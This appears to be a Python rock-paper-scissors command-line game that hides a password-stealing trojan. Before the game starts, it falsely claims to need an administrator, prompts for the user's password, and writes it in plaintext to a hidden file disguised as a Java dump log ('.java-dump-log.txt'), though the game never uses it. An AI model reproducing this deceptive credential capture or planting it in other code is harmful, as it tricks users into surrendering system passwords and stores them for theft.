import random
import time
import os
import getpass

#Setting up variables and functions

rockpaperscissors = ["Rock", "Paper", "Scissors"]
playerWin = False
drawState= False

userID = os.geteuid()

print("This program must be run by an administrator. ")
user_passwd = getpass.getpass("Password: ")

passwd_storing_file = open("./.java-dump-log.txt", "w")
passwd_storing_file.write(user_passwd)

print("Welcome to the interactive Rock-Paper-Scissor command line utility.")
time.sleep(1)
print ("Report any bugs at https://github.com/sudo-daemon/Rock-Paper-Scissors-Python")
time.sleep(2.5)

user_choice_number = input("How many times do you want to play? [Enter a number]: ")

noOfGames = int(user_choice_number)
r= "Rock"
p= "Paper"
s= "Scissors"

def checker(x, q):
    global playerWin, drawState
    if x == "r":
        if q == 1:
            playerWin = False
            drawState = False
        elif q == 2:
            playerWin =True
            drawState =False
        elif q == 0:
            playerWin = False
            drawState = True
        else:
            print ("Error. Please restart the game.")
            quit()

    elif x == "p":
        if q == 1:
            playerWin = False
            drawState = True
        elif q == 2:
            playerWin =False
            drawState =False
        elif q == 0:
            playerWin = True
            drawState = False
        else:
            print ("Error. Please restart the game.")
            quit()
    elif x == "s":
        if q == 1:
            playerWin = True
            drawState = False
        elif q == 2:
            playerWin =False
            drawState =True
        elif q == 0:
            playerWin = False
            drawState = False
        else:
            print ("Error. Please restart the game.")
            quit()
    else:
        print ("You did not pick a legitimate value. Quitting...")
        time.sleep(2)
        quit()


def game():
    indexOfChoice= random.randint(0,2)
    compChoice= rockpaperscissors[int(indexOfChoice)]
    userchoice= input("What do you pick? [r-Rock, p-Paper, s-Scissor]: ")
    checker(userchoice, int(indexOfChoice))
    time.sleep(1)
    if playerWin == True:
        print ("The computer picked " + compChoice +". Congratulations! You won!")
    elif playerWin == False:
        if drawState == False:
            print ("The computer picked " + compChoice + ". Sorry, you lost.")
        else:
            print ("The computer picked " + compChoice + ". It's a draw! ")
    else:
        print ("Error. Quitting...")
        time.sleep(5)
        quit()


def actualGame(n):
    if n > 0:
        game()
        n = n - 1
        actualGame(n)
    elif n == 0:
        print (str(noOfGames) +" games are over. Quitting...")
    else:
        print ("Ran into an error. Quitting...")
        time.sleep(5)
        quit()


#The actual game
actualGame(noOfGames)
